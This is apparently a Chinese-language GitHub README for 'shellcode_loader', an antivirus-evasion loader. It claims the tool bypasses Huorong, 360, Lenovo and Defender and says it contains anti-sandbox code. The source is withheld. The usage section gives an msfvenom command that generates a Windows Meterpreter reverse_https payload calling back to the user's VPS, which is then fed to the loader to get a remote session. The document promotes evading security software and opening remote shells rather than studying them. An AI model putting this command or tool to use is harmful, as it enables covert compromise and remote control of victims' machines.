# shellcode_loader
一款shellcode免杀工具，免杀测试对象火绒 360 联想等其他杀软,源码暂时就不放出来了效果如图。里面加了反沙箱的代码，所以在虚拟机运行会有问题

上线效果如图：
![图片](https://user-images.githubusercontent.com/83112602/171603146-feec6c7a-ab83-4a8f-a921-c21db33e27a8.png)

免杀效果

火绒：![图片](https://user-images.githubusercontent.com/83112602/171603373-f50c1d92-d21f-4666-badc-2b6881e3b0a6.png)
360：![图片](https://user-images.githubusercontent.com/83112602/171603468-4cbad515-e887-4e55-b678-72e56dd13a0b.png)
联想：![图片](https://user-images.githubusercontent.com/83112602/171603645-e25e7e99-c128-494c-83b8-ecc45e01989a.png)
defender：![图片](https://user-images.githubusercontent.com/83112602/171606923-c4f34f41-b1ba-4510-ba7c-f3ae7c7ca370.png)


使用方法 msf生成 payload
msfvenom -p windows/x64/meterpreter/reverse_https  Lhost=vps地址 Lport=vps端口 -f hex

cmd界面输入打开loader输入payload上线
![图片](https://user-images.githubusercontent.com/83112602/171603890-e5ac8e02-433c-44b8-accd-f199cb0f1674.png)
